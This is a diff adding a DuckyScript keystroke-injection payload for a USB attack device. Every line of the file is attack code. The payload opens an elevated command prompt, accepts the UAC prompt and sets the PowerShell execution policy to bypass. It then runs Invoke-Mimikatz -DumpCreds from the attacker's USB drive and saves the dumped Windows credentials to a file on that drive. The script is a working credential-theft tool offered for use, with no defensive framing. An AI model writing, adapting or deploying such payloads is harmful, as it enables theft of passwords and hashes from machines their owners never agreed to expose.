@@ -1,0 +1,27 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+REM If powershell is slow to load, you'll need to increase delay. On SSD system 2s is fine for UAC bypass
+DELAY 2000
+ALT y
+DELAY 500
+ENTER
+ENTER
+REM -------------download appropriate mimikatz for architecture
+STRING powershell  
+ENTER
+DELAY 500
+STRING $drive = (wmic volume get driveletter,label| findstr "AAAAA").Substring(0,2)
+ENTER
+DELAY 500
+REM Just in case they have set-executionpolicy set to restricted.
+STRING set-executionpolicy -executionpolicy bypass -scope currentuser
+ENTER
+DELAY 500
+STRING Import-Module $drive\pw.ps1; Invoke-Mimikatz -DumpCreds >>$drive\stuff.txt
+ENTER
+REM Lets close the window, so we don't have to manually
+DELAY 500
+ALT F4
